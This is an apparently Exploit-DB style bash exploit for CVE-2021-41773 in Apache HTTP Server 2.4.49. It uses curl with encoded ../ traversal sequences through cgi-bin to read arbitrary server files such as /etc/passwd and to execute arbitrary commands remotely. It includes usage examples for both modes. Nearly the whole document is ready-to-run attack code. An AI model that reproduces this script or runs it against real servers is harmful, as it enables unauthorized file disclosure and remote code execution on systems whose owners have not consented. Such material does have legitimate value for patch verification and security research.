# Exploit Title: Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution (RCE)
# Date: 10/05/2021
# Exploit Author: Lucas Souza https://lsass.io
# Vendor Homepage:  https://apache.org/
# Version: 2.4.49
# Tested on: 2.4.49
# CVE : CVE-2021-41773
# Credits Exploit: Izael Magalhaes

#!/bin/bash

host=$1
cmd=$2
file=$3

if [[ -z "$1" || -z "$2" ]]; then
    echo "    === How To Use ==="
    echo "[+] ./50383.sh 192.168.1.1 /etc/passwd"
    echo "[+] ./50383.sh 192.168.1.1 /bin/bash whoami"
    exit
fi

if [ -z "$3" ]; then
    echo "------"
    echo "Read File "$2
    echo "------"
    curl -s --path-as-is -d "echo Content-Type: text/plain; echo;" "$host/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e$2"
     echo "------"
else
    echo "------"
    echo "RCE "$2 $3
    echo "------"
    curl -s --path-as-is -d "echo Content-Type: text/plain; echo; $3" "$host/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e$2"
    echo "------"

fi



